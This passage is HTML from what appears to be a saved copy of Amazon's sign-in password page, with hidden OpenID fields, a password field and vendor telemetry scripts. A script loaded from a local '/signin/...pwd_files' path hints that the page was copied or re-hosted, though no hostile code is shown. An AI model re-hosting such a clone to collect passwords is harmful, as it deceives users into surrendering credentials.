21DP5sHxPH8Nui5SRrhoMsmhxkJlFJa5zb985cmSkAcdG71tRKBeIXsvmT8izO5d+xNoVAYE8q0nInHi/tJ6n8ippTa3IXn2ggnzgUMFBYjPqQ1dwNqNK7BY2pPje7KGvjdCuglKLQewChIcrECMtr/Gjv8irJYDrNNtZMaNLziOQKM4/3NxmQwbXhhiPvBQFWvZS/QnoLWlSCx+FKSVTDLfM2/eRrgrkqzGNt2atwaEVZLZPNyggzPLa6MaQzbLVZAky8NaM3a2F4v9B+NZOFRFxLK24kvReddRhoYDLzF4KmPyrReLEW0e0CRwh2b+GMrcOOmCFIiCaWK9MDyAWBaRqODFUDH2FMuYJ+Xa4XHY6UYTpDuJcRw1H6uev6CG7PQYoOIXth8eppoB02fHS/jrw3C3+KTi/3i+pWOTpjZjZ3qmSZ1gJZ0JOJXmtAX9kCoSq+r7w1Zvloi1mxGZ0q3MKDWr2EAyHlPl2igaygmhB5S4JBrPpl9MZm7B3cNlf8ur/WTlnJWpHjxZ/e3a8LCrIZ6v+rCJjptRPOyMqaicTv1hQPciBguz00OT0YJvwRq8Dy+kq5/9+bJiJz7LQ/fVTTtMqD5J18lMHl1hhezI33MH4vUayXbOGk8aMendSy1ZnS95KWFBRjjegQ/NDSEH+jmhTOSkXnXUR9mUmHQ2fUwYeer55D1KH6zfeD+QCjxvANOfNYv5yyHX0x6gswwHtKO2tRzUQSinGi0iSMSSIKJSB/AYhjdw8t/FYXDqZC3aX7Ak+CBAMRCML/CQkTsZFz/M56K768LPE9Bi7D5KceIGw6gnNhmQnzjqyjt+CelnGaFhGJZwbwK6e9K1xPjS6QYaxZSvooRmedQ8P12dSyD+YlteN13+pzem6Yrx+6loBZUcI4t4IgVgHTRRc+F8x9c6b3WwFzr5yoday8e2Hq+PNVpq6ZXBeDb0xU2rpNlQA6tsyoXBL2aAnuP5pmK6ZbrDADI1H1sGYZX2x2X3lOiar48eueIcbFfk22mPMBbdngoCwspmmH1Tubj0iXTSDMwJaxULK/4cXm2qQCV6pI+aqhPOSIqpPkhW3xYimqFHUzByvN9BHyj3sG/dcwPKXaTkWWXNkpF9usAGfsmnmdEBKL/9yjgd03RtXq7xJTR9XF/MvLb8tBeh1bPtBc7PibrYOWCAB5u1CCTLiIjhgFGV80PM7w7H+rFFC3Yhv4GaRayEOBeoVazS+XYTIJFSkHMsRWke7Z2EZBaa+IlakO9IYfPoh6rxq7JANhCOObBTbWkfYlOxbJcs4CD8YfFqmqXVatkSeMFUKhRHywgkyvi026TkH/u5tgQu/ulH2clis1U8acA1kn46+sTg87KsQUTbZV5d49F8i4nNwyhXK8mHlx8Y/rNsbDmlulqtbxd8vDqtAIeS2dlM/cOsVZ3gHaqxvzfwCGRxlYgqv763Rd6YH4iZB7Tr0l2A2dzbhNib1XB7ynZRHclByUkD1CZxnBMInr+xv9EF3+i6UURzOmI0ip/bTDSwXxPotW3up4aGzPdQ3QtIxqaBNvuiEEhxfWjQaLmfXBF4x4ICox2y9DFbsBNq+FERreTzFj71EE5i9g6YWtXEc/own1B4ew0PfoMkP4zDoAajW65GhZeJb5BhO3E/KlBl3gobaOUt1K5Mpvgz/BexeU3H4IOCveaf3syFRgJzD0HWwbMXkOJ++1ASyNBgFttAP4IrTHK5YglSZ3b5HrevbgZ03XjBcKViuh9mbM7NgSvzK3SGxneeFG4rD4YWdCcQib7jWedfaIblD3+UxM9ymgCakgYOOUqN4s2aS/LIZAtKb4GdJbR8PacUDdnF/L3GVDL3nt6w37Y2etRr57s2fV5w+CITRKnVISTW0XPisHiT2cPHmvwR7MeLPCLuvoEhEnHNx5bgU70BRXrtgLVV7kgJr9I/FQOZqwPx98KqnqFQIxAEpiudnkUy+8WOJavks/48UgJX5zv6KrmvG38OtCwd/TweDNhU/rfuX+Y/UMKmE+qIIktrRLqVy1q215Loy/vS4rczVnrM/juwAHrEjncOKU4+LB75AiwBjp0k/wXzvubLe3Xry4j370HDaiBqO0932XeK2URu4n8355aU15X/UWVAISd3gOrvPTOj4X3y3ysF8vfYg3UOwbFLhC0tntV7vRb3J7HpX3I2w2sS4jbbOUiQ8w2DvWGnOvBFJ9v80KxClAO9RC36J20uQ60OYlCx9N0ry9u/sLGeQ7gfK0s4tZx0dYpfmQM=">
  
    <input type="hidden" name="openid.return_to" value="ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvbS95b3VyLWFjY291bnQ/cmVmXz1uYXZfeWFfc2lnbmlu">
  
    <input type="hidden" name="prevRID" value="ape:R0Q4QlRNWkQyRDBWOFBXRlFTWEU=">
  
    <input type="hidden" name="workflowState" value="eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.8zFrMdbqqzxU2QrP6JvSDmaKR6cqvyL_iBus_dt87-rQF5BgQSuj_w.qNg8QYwgcqcLdK4F.DlWXEZ1EuWFuUH-au3E-ovboa4wlwFBZG_pZxjzqJYfxrKR4caFaKGiT7Xzlo2bXqMIFqW5qXMug0kXHk58TvfC77dKALOW4HvdGsajaOD2qCQQwG4mKz2RRCBhdY2g-sPJH-oZpW7CB1HKMTT4s-deTsEKh5oKvXEEtKzv-e8zbfZ-Rbf4up_FN8RJgzhZC9Xo9HSyUNkMfh4Bq0H0X8ci_zhjYEKoyWGgrHquAZMXrL0AbQLkRJCNAPLLah3iyWk-ZhPXZte8BbiEY6p0L01Af9lAVCyekWhhE5att0H7DyBItsFp5KycekQ2ONtM3t5sR2n6vNOgJLsNzTOj0JEyPxjRvI13BaFER_afwbL3F1nKHUjK5xGSs1WRVmL-jG0Mb4TTUOdd7t8sKJkU0anl5RRcn2mhkX5wI2FBYevtmuR11SzDnbMU5tUb5KLrs.RoRGct4yzDDnMWVDY9w0NQ">
  


      <div class="a-section">
        
        <input type="hidden" name="email" value="" id="ap_email">
        <input type="text" value="" id="ap-credential-autofill-hint" autocomplete="email" name="email" class="a-input-text hide" data-claim="">
        
        





<div class="a-section a-spacing-large">
  <div class="a-row">
    <div class="a-column a-span5">
      <label for="ap_password" class="a-form-label">
        
          
            Password
          
          
        
      </label>
    </div>

    
    
      <div class="a-column a-span7 a-text-right a-span-last">
        



  
  
  
    
  

<a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&amp;prevRID=GD8BTMZD2D0V8PWFQSXE&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJLclNqMHI0ZGlFTlozY01LRVY5Q1dnPT0iLCJ2ZXJzaW9uIjoxLCJJViI6IjNRZ2J5cU5XTnEzUFoxWGRudndVd1E9PSJ9&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1616435376000">
  Forgot your password?
</a>
      </div>
    
  </div>
  
  
    
    
      
    
  
  <input type="password" maxlength="1024" id="ap_password" name="password-field" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field">

  
    



<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
  Enter your password
</div></div></div>

  
</div>

  

<input type="hidden" name="encryptedPasswordExpected">
<script type="a-state" data-a-state="{&quot;key&quot;:&quot;sif-encryption-profile&quot;}">{"sifProfile":"AuthenticationPortalSigninNA"}</script>

<script type="text/javascript" async="" src="/signin/Amazon Sign-In-pwd_files/AuthenticationPortalSigninNA.js">
</script>


        
        









        <div class="a-section">
          
          <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
            Sign-In
          </span></span></span>
          
<script>
  function cf() {
    if (typeof window.uet === 'function') {
      uet('cf');
    }
    if (window.embedNotification &&
      typeof window.embedNotification.onCF === 'function') {
      embedNotification.onCF();
    }
  }
</script>

<script type="text/javascript">cf()</script>


          
          




  <div class="a-row a-spacing-top-medium">
    <div class="a-section a-text-left">
      <label for="auth-remember-me" class="a-form-label">
        <div data-a-input-name="rememberMe" class="a-checkbox"><label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
          Keep me signed in.
          <span class="a-declarative" data-action="a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;,&quot;inlineContent&quot;:&quot;\u003cp&gt;Choosing \&quot;Keep me signed in\&quot; reduces the number of times you&#39;re asked to Sign-In on this device.\u003c\/p&gt;\n\u003cp&gt;To keep your account secure, use this option only on your personal devices.\u003c\/p&gt;&quot;}">
            <a id="remember_me_learn_more_link" href="javascript:void(0)" class="a-popover-trigger a-declarative">
              Details
            <i class="a-icon a-icon-popover"></i></a>
          </span>
        </span></label></div>
      </label>
    </div>
  </div>


          

          
          
        </div>
      </div>
    </form>
  </div></div>
</div>

  






  








</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
      Conditions of Use
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
      Privacy Notice
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="https://www.amazon.com/help">
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-2021, Amazon.com, Inc. or its affiliates
</span>

</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    

<script type="text/javascript">
  try {
    var metadataList = document.getElementsByName('metadata1');
    if (metadataList.length == 0) {
      var input = document.createElement('input');
      input.name = 'metadata1';
      input.type = 'hidden';
      input.value = 'true';

      var authenticationFormList = document.getElementsByName('signIn');
      for (var index = 0; index < authenticationFormList.length; index++) {
        authenticationFormList[index].appendChild(input);
      }
    } else {
      for (var index = 0; index < metadataList.length; index++) {
        metadataList[index].value = 'true';
      }
    }
  } catch (e) {
    if (typeof window.ueLogError === 'function') {
      window.ueLogError(e, {
        message: 'Failed to populate default metadata value',
        logLevel: 'warn',
        attribution: 'FWCIMAssets'
      });
    }
  }
</script>
<script type="text/javascript">
    window.fwcimCmd = [
        
            ['profile', 'signIn']
            
        
    ];
</script>

    
    <!-- cache slot rendered -->
    
  </div><div id="be" style="display:none;visibility:hidden;"><form name="ue_backdetect" action="https://www.amazon.com/ap/get"><input type="hidden" name="ue_back" value="2"></form>


<script type="text/javascript">
window.ue_ibe = (window.ue_ibe || 0) + 1;
if (window.ue_ibe === 1) {
(function(e,c){function h(b,a){f.push([b,a])}function g(b,a){if(b){var c=e.head||e.getElementsByTagName("head")[0]||e.documentElement,d=e.createElement("script");d.async="async";d.src=b;d.setAttribute("crossorigin","anonymous");a&&a.onerror&&(d.onerror=a.onerror);a&&a.onload&&(d.onload=a.onload);c.insertBefore(d,c.firstChild)}}function k(){ue.uels=g;for(var b=0;b<f.length;b++){var a=f[b];g(a[0],a[1])}ue.deffered=1}var f=[];c.ue&&(ue.uels=h,c.ue.attach&&c.ue.attach("load",k))})(document,window);


if (window.ue && window.ue.uels) {
            ue.uels("https://images-na.ssl-images-amazon.com/images/I/31YXrY93hfL.js");
}
var ue_mbl=ue_csm.ue.exec(function(e,a){function l(g){b=g||{};a.AMZNPerformance=b;b.transition=b.transition||{};b.timing=b.timing||{};if(a.csa){var c;b.timing.transitionStart&&(c=b.timing.transitionStart);b.timing.processStart&&(c=b.timing.processStart);c&&(csa("PageTiming")("mark","mobileTransitionStart",c),csa("PageTiming")("mark","transitionStart",c))}e.ue.exec(m,"csm-android-check")()&&b.tags instanceof Array&&(g=-1!=b.tags.indexOf("usesAppStartTime")||b.transition.type?!b.transition.type&&-1<
b.tags.indexOf("usesAppStartTime")?"warm-start":void 0:"view-transition",g&&(b.transition.type=g));"reload"===d._nt&&e.ue_orct||"intrapage-transition"===d._nt?a.performance&&performance.timing&&performance.timing.navigationStart?b.timing.transitionStart=a.performance.timing.navigationStart:delete b.timing.transitionStart:"undefined"===typeof d._nt&&a.performance&&performance.timing&&performance.timing.navigationStart&&a.history&&"function"===typeof a.History&&"object"===typeof a.history&&history.length&&
1!=history.length&&(b.timing.transitionStart=a.performance.timing.navigationStart);g=b.transition;c=d._nt?d._nt:void 0;g.subType=c;a.ue&&a.ue.tag&&a.ue.tag("has-AMZNPerformance");d.isl&&a.uex&&uex("at","csm-timing");n()}function p(b){a.ue&&a.ue.count&&a.ue.count("csm-cordova-plugin-failed",1)}function m(){return a.cordova&&a.cordova.platformId&&"android"==a.cordova.platformId}function n(){try{P.register("AMZNPerformance",function(){return b})}catch(a){}}function h(){if(!b)return"";ue_mbl.cnt=null;
for(var a=b.timing,c=b.transition,a=["mts",k(a.transitionStart),"mps",k(a.processStart),"mtt",c.type,"mtst",c.subType,"mtlt",c.launchType],c="",d=0;d<a.length;d+=2){var e=a[d],f=a[d+1];"undefined"!==typeof f&&(c+="&"+e+"="+f)}return c}function k(a){if("undefined"!==typeof a&&"undefined"!==typeof f)return a-f}function q(a,c){b&&(f=c,b.timing.transitionStart=a,b.transition.type="view-transition",b.transition.subType="ajax-transition",b.transition.launchType="normal",ue_mbl.cnt=h)}var d=e.ue||{},f=e.ue_t0,
b;if(a.P&&a.P.when&&a.P.register)return 1===a.ue_fnt&&(f=a.aPageStart||e.ue_t0),a.P.when("CSMPlugin").execute(function(a){a.buildAMZNPerformance&&a.buildAMZNPerformance({successCallback:l,failCallback:p})}),{cnt:h,ajax:q}},"mobile-timing")(ue_csm,window);

(function(d){d._uess=function(){var a="";screen&&screen.width&&screen.height&&(a+="&sw="+screen.width+"&sh="+screen.height);var b=function(a){var b=document.documentElement["client"+a];return"CSS1Compat"===document.compatMode&&b||document.body["client"+a]||b},c=b("Width"),b=b("Height");c&&b&&(a+="&vw="+c+"&vh="+b);return a}})(ue_csm);

(function(a){var b=document.ue_backdetect;b&&b.ue_back&&a.ue&&(a.ue.bfini=b.ue_back.value);a.uet&&a.uet("be");a.onLdEnd&&(window.addEventListener?window.addEventListener("load",a.onLdEnd,!1):window.attachEvent&&window.attachEvent("onload",a.onLdEnd));a.ueh&&a.ueh(0,window,"load",a.onLd,1);a.ue&&a.ue.tag&&(a.ue_furl?(b=a.ue_furl.replace(/\./g,"-"),a.ue.tag(b)):a.ue.tag("nofls"))})(ue_csm);

(function(g,h){function d(a,d){var b={};if(!e||!f)try{var c=h.sessionStorage;c?a&&("undefined"!==typeof d?c.setItem(a,d):b.val=c.getItem(a)):f=1}catch(g){e=1}e&&(b.e=1);return b}var b=g.ue||{},a="",f,e,c,a=d("csmtid");f?a="NA":a.e?a="ET":(a=a.val,a||(a=b.oid||"NI",d("csmtid",a)),c=d(b.oid),c.e||(c.val=c.val||0,d(b.oid,c.val+1)),b.ssw=d);b.tabid=a})(ue_csm,window);

ue_csm.ue.exec(function(e,f){var a=e.ue||{},b=a._wlo,d;if(a.ssw){d=a.ssw("CSM_previousURL").val;var c=f.location,b=b?b:c&&c.href?c.href.split("#")[0]:void 0;c=(b||"")===a.ssw("CSM_previousURL").val;!c&&b&&a.ssw("CSM_previousURL",b);d=c?"reload":d?"intrapage-transition":"first-view"}else d="unknown";a._nt=d},"NavTypeModule")(ue_csm,window);
ue_csm.ue.exec(function(c,a){function g(a){a.run(function(e){d.tag("csm-feature-"+a.name+":"+e);d.isl&&c.uex("at")})}if(a.addEventListener)for(var d=c.ue||{},f=[{name:"touch-enabled",run:function(b){var e=function(){a.removeEventListener("touchstart",c,!0);a.removeEventListener("mousemove",d,!0)},c=function(){b("true");e()},d=function(){b("false");e()};a.addEventListener("touchstart",c,!0);a.addEventListener("mousemove",d,!0)}}],b=0;b<f.length;b++)g(f[b])},"csm-features")(ue_csm,window);


(function(b,c){var a=c.images;a&&a.length&&b.ue.count("totalImages",a.length)})(ue_csm,document);
(function(b){function c(){var d=[];a.log&&a.log.isStub&&a.log.replay(function(a){e(d,a)});a.clog&&a.clog.isStub&&a.clog.replay(function(a){e(d,a)});d.length&&(a._flhs+=1,n(d),p(d))}function g(){a.log&&a.log.isStub&&(a.onflush&&a.onflush.replay&&a.onflush.replay(function(a){a[0]()}),a.onunload&&a.onunload.replay&&a.onunload.replay(function(a){a[0]()}),c())}function e(d,b){var c=b[1],f=b[0],e={};a._lpn[c]=(a._lpn[c]||0)+1;e[c]=f;d.push(e)}function n(b){q&&(a._lpn.csm=(a._lpn.csm||0)+1,b.push({csm:{k:"chk",
f:a._flhs,l:a._lpn,s:"inln"}}))}function p(a){if(h)a=k(a),b.navigator.sendBeacon(l,a);else{a=k(a);var c=new b[f];c.open("POST",l,!0);c.setRequestHeader&&c.setRequestHeader("Content-type","text/plain");c.send(a)}}function k(a){return JSON.stringify({rid:b.ue_id,sid:b.ue_sid,mid:b.ue_mid,mkt:b.ue_mkt,sn:b.ue_sn,reqs:a})}var f="XMLHttpRequest",q=1===b.ue_ddq,a=b.ue,r=b[f]&&"withCredentials"in new b[f],h=b.navigator&&b.navigator.sendBeacon,l="//"+b.ue_furl+"/1/batch/1/OE/",m=b.ue_fci_ft||5E3;a&&(r||h)&&
(a._flhs=a._flhs||0,a._lpn=a._lpn||{},a.attach&&(a.attach("beforeunload",g),a.attach("pagehide",g)),m&&b.setTimeout(c,m),a._ffci=c)})(window);


(function(k,c){function l(a,b){return a.filter(function(a){return a.initiatorType==b})}function f(a,c){if(b.t[a]){var g=b.t[a]-b._t0,e=c.filter(function(a){return 0!==a.responseEnd&&m(a)<g}),f=l(e,"script"),h=l(e,"link"),k=l(e,"img"),n=e.map(function(a){return a.name.split("/")[2]}).filter(function(a,b,c){return a&&c.lastIndexOf(a)==b}),q=e.filter(function(a){return a.duration<p}),s=g-Math.max.apply(null,e.map(m))<r|0;"af"==a&&(b._afjs=f.length);return a+":"+[e[d],f[d],h[d],k[d],n[d],q[d],s].join("-")}}
function m(a){return a.responseEnd-(b._t0-c.timing.navigationStart)}function n(){var a=c[h]("resource"),d=f("cf",a),g=f("af",a),a=f("ld",a);delete b._rt;b._ld=b.t.ld-b._t0;b._art&&b._art();return[d,g,a].join("_")}var p=20,r=50,d="length",b=k.ue,h="getEntriesByType";b._rre=m;b._rt=c&&c.timing&&c[h]&&n})(ue_csm,window.performance);


(function(c,d){var b=c.ue,a=d.navigator;b&&b.tag&&a&&(a=a.connection||a.mozConnection||a.webkitConnection)&&a.type&&b.tag("netInfo:"+a.type)})(ue_csm,window);


(function(c,d){function h(a,b){for(var c=[],d=0;d<a.length;d++){var e=a[d],f=b.encode(e);if(e[k]){var g=b.metaSep,e=e[k],l=b.metaPairSep,h=[],m=void 0;for(m in e)e.hasOwnProperty(m)&&h.push(m+"="+e[m]);e=h.join(l);f+=g+e}c.push(f)}return c.join(b.resourceSep)}function s(a){var b=a[k]=a[k]||{};b[t]||(b[t]=c.ue_mid);b[u]||(b[u]=c.ue_sid);b[f]||(b[f]=c.ue_id);b.csm=1;a="//"+c.ue_furl+"/1/"+a[v]+"/1/OP/"+a[w]+"/"+a[x]+"/"+h([a],y);if(n)try{n.call(d[p],a)}catch(g){c.ue.sbf=1,(new Image).src=a}else(new Image).src=
a}function q(){g&&g.isStub&&g.replay(function(a,b,c){a=a[0];b=a[k]=a[k]||{};b[f]=b[f]||c;s(a)});l.impression=s;g=null}if(!(1<c.ueinit)){var k="metadata",x="impressionType",v="foresterChannel",w="programGroup",t="marketplaceId",u="session",f="requestId",p="navigator",l=c.ue||{},n=d[p]&&d[p].sendBeacon,r=function(a,b,c,d){return{encode:d,resourceSep:a,metaSep:b,metaPairSep:c}},y=r("","?","&",function(a){return h(a.impressionData,z)}),z=r("/",":",",",function(a){return a.featureName+":"+h(a.resources,
A)}),A=r(",","@","|",function(a){return a.id}),g=l.impression;n?q():(l.attach("load",q),l.attach("beforeunload",q));try{d.P&&d.P.register&&d.P.register("impression-client",function(){})}catch(B){c.ueLogError(B,{logLevel:"WARN"})}}})(ue_csm,window);



var ue_pty = "AuthenticationPortal";

var ue_spty = "SignInPwdCollect";



var ue_adb = 4;
var ue_adb_rtla = 1;
ue_csm.ue.exec(function(y,a){function t(){if(d&&f){var a;a:{try{a=d.getItem(g);break a}catch(c){}a=void 0}if(a)return b=a,!0}return!1}function u(){if(a.fetch)fetch(m).then(function(a){if(!a.ok)throw Error(a.statusText);return a.text?a.text():null}).then(function(b){b?(-1<b.indexOf("window.ue_adb_chk = 1")&&(a.ue_adb_chk=1),n()):h()})["catch"](h);else e.uels(m,{onerror:h,onload:n})}function h(){b=k;l();if(f)try{d.setItem(g,b)}catch(a){}}function n(){b=1===a.ue_adb_chk?p:k;l();if(f)try{d.setItem(g,
b)}catch(c){}}function q(){a.ue_adb_rtla&&c&&0<c.ec&&!1===r&&(c.elh=null,ueLogError({m:"Hit Info",fromOnError:1},{logLevel:"INFO",adb:b}),r=!0)}function l(){e.tag(b);e.isl&&a.uex&&uex("at",b);s&&s.updateCsmHit("adb",b);c&&0<c.ec?q():a.ue_adb_rtla&&c&&(c.elh=q)}function v(){return b}if(a.ue_adb){a.ue_fadb=a.ue_fadb||10;var e=a.ue,k="adblk_yes",p="adblk_no",m="https://m.media-amazon.com/images/G/01/csm/showads.v2.js?adtag=csm",b="adblk_unk",d;a:{try{d=a.localStorage;break a}catch(z){}d=void 0}var g=
"csm:adb",c=a.ue_err,s=e.cookie,f=void 0!==a.localStorage,w=Math.random()>1-1/a.ue_fadb,r=!1,x=t();w||!x?u():l();a.ue_isAdb=v;a.ue_isAdb.unk="adblk_unk";a.ue_isAdb.no=p;a.ue_isAdb.yes=k}},"adb")(document,window);




(function(c,l,m){function h(a){if(a)try{if(a.id)return"//*[@id='"+a.id+"']";var b,d=1,e;for(e=a.previousSibling;e;e=e.previousSibling)e.nodeName===a.nodeName&&(d+=1);b=d;var c=a.nodeName;1!==b&&(c+="["+b+"]");a.parentNode&&(c=h(a.parentNode)+"/"+c);return c}catch(f){return"DETACHED"}}function f(a){if(a&&a.getAttribute)return a.getAttribute(k)?a.getAttribute(k):f(a.parentElement)}var k="data-cel-widget",g=!1,d=[];(c.ue||{}).isBF=function(){try{var a=JSON.parse(localStorage["csm-bf"]||"[]"),b=0<=a.indexOf(c.ue_id);
a.unshift(c.ue_id);a=a.slice(0,20);localStorage["csm-bf"]=JSON.stringify(a);return b}catch(d){return!1}}();c.ue_utils={getXPath:h,getFirstAscendingWidget:function(a,b){c.ue_cel&&c.ue_fem?!0===g?b(f(a)):d.push({element:a,callback:b}):b()},notifyWidgetsLabeled:function(){if(!1===g){g=!0;for(var a=f,b=0;b<d.length;b++)if(d[b].hasOwnProperty("callback")&&d[b].hasOwnProperty("element")){var c=d[b].callback,e=d[b].element;"function"===typeof c&&"function"===typeof a&&c(a(e))}d=null}},extractStringValue:function(a){if("string"===
typeof a)return a}}})(ue_csm,window,document);





ue_csm.ue_unrt = 1500;
(function(d,b,t){function u(a,g){var c=a.srcElement||a.target||{},b={k:v,t:g.t,dt:g.dt,x:a.pageX,y:a.pageY,p:e.getXPath(c),n:c.nodeName};a.button&&(b.b=a.button);c.type&&(b.ty=c.type);c.href&&(b.r=e.extractStringValue(c.href));c.id&&(b.i=c.id);c.className&&c.className.split&&(b.c=c.className.split(/\s+/));h+=1;e.getFirstAscendingWidget(c,function(a){b.wd=a;d.ue.log(b,r)})}function w(a){if(!x(a.srcElement||a.target)){m+=1;n=!0;var g=f=d.ue.d(),c;p&&"function"===typeof p.now&&a.timeStamp&&(c=p.now()-
a.timeStamp,c=parseFloat(c.toFixed(2)));s=b.setTimeout(function(){u(a,{t:g,dt:c})},y)}}function z(a){if(a){var b=a.filter(A);a.length!==b.length&&(q=!0,k=d.ue.d(),n&&q&&(k&&f&&d.ue.log({k:B,t:f,m:Math.abs(k-f)},r),l(),q=!1,k=0))}}function A(a){if(!a)return!1;var b="characterData"===a.type?a.target.parentElement:a.target;if(!b||!b.hasAttributes||!b.attributes)return!1;var c={"class":"gw-clock gw-clock-aria s-item-container-height-auto feed-carousel using-mouse kfs-inner-container".split(" "),id:["dealClock",
"deal_expiry_timer","timer"],role:["timer"]},d=!1;Object.keys(c).forEach(function(a){var e=b.attributes[a]?b.attributes[a].value:"";(c[a]||"").forEach(function(a){-1!==e.indexOf(a)&&(d=!0)})});return d}function x(a){if(!a)return!1;var b=(e.extractStringValue(a.nodeName)||"").toLowerCase(),c=(e.extractStringValue(a.type)||"").toLowerCase(),d=(e.extractStringValue(a.href)||"").toLowerCase();a=(e.extractStringValue(a.id)||"").toLowerCase();var f="checkbox color date datetime-local email file month number password radio range reset search tel text time url week".split(" ");
if(-1!==["select","textarea","html"].indexOf(b)||"input"===b&&-1!==f.indexOf(c)||"a"===b&&-1!==d.indexOf("http")||-1!==["sitbreaderrightpageturner","sitbreaderleftpageturner","sitbreaderpagecontainer"].indexOf(a))return!0}function l(){n=!1;f=0;b.clearTimeout(s)}function C(){b.ue.onunload(function(){ue.count("armored-cxguardrails.unresponsive-clicks.violations",h);ue.count("armored-cxguardrails.unresponsive-clicks.violationRate",h/m*100||0)})}if(b.MutationObserver&&b.addEventListener&&Object.keys&&
d&&d.ue&&d.ue.log&&d.ue_unrt&&d.ue_utils){var y=d.ue_unrt,r="cel",v="unr_mcm",B="res_mcm",p=b.performance,e=d.ue_utils,n=!1,f=0,s=0,q=!1,k=0,h=0,m=0;b.addEventListener&&(b.addEventListener("mousedown",w,!0),b.addEventListener("beforeunload",l,!0),b.addEventListener("visibilitychange",l,!0),b.addEventListener("pagehide",l,!0));b.ue&&b.ue.event&&b.ue.onSushiUnload&&b.ue.onunload&&C();(new MutationObserver(z)).observe(t,{childList:!0,attributes:!0,characterData:!0,subtree:!0})}})(ue_csm,window,document);


ue_csm.ue.exec(function(g,e){if(e.ue_err){var f="";e.ue_err.errorHandlers||(e.ue_err.errorHandlers=[]);e.ue_err.errorHandlers.push({name:"fctx",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel)if(f=g.getElementsByTagName("html")[0].innerHTML){var b=f.indexOf("var ue_t0=ue_t0||+new Date();");if(-1!==b){var b=f.substr(0,b).split(String.fromCharCode(10)),d=Math.max(b.length-10-1,0),b=b.slice(d,b.length-1);a.fcsmln=d+b.length+1;a.cinfo=a.cinfo||{};for(var c=0;c<b.length;c++)a.cinfo[d+c+1+""]=
b[c]}b=f.split(String.fromCharCode(10));a.cinfo=a.cinfo||{};if(!(a.f||void 0===a.l||a.l in a.cinfo))for(c=+a.l-1,d=Math.max(c-5,0),c=Math.min(c+5,b.length-1);d<=c;d++)a.cinfo[d+1+""]=b[d]}}})}},"fatals-context")(document,window);


(function(m,a){function c(k){function f(b){b&&"string"===typeof b&&(b=(b=b.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i))&&1<b.length?b[1]:null,b&&b&&("number"===typeof e[b]?e[b]++:e[b]=1))}function d(b){var e=10,d=+new Date;b&&b.timeRemaining?e=b.timeRemaining():b={timeRemaining:function(){return Math.max(0,e-(+new Date-d))}};for(var c=a.performance.getEntries(),k=e;g<c.length&&k>n;)c[g].name&&f(c[g].name),g++,k=b.timeRemaining();g>=c.length?h(!0):l()}function h(b){if(!b){b=m.scripts;var c;if(b)for(var d=
0;d<b.length;d++)(c=b[d].getAttribute("src"))&&"undefined"!==c&&f(c)}0<Object.keys(e).length&&(p&&ue_csm.ue&&ue_csm.ue.event&&ue_csm.ue.event({domains:e,pageType:a.ue_pty||null,subPageType:a.ue_spty||null,pageTypeId:a.ue_pti||null},"csm","csm.CrossOriginDomains.2"),a.ue_ext=e)}function l(){!0===k?d():a.requestIdleCallback?a.requestIdleCallback(d):a.requestAnimationFrame?a.requestAnimationFrame(d):a.setTimeout(d,100)}function c(){if(a.performance&&a.performance.getEntries){var b=a.performance.getEntries();
